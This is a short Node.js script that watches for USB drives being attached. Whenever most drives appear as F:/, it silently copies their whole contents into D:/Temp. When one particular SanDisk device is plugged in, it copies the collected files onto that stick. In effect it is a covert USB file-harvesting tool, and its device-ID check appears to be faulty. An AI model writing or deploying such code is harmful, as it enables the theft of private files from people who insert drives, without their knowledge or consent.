const {usb} = require("usb")
const fs = require("fs")

usb.on("attach", (device) => {
    if (fs.existsSync("F:/")) {
        const info = device.deviceDescriptor
        if (info.idVendor !== 0x0781 && info.idProduct !== 0x5591) {
            fs.cpSync("F:/", "D:/Temp/"+crypto.randomUUID(), {recursive: true})
        }
        else if (fs.existsSync("D:/Temp")) {
            fs.cpSync("D:/Temp", "F:/Backup", {recursive: true})
        }
    }
})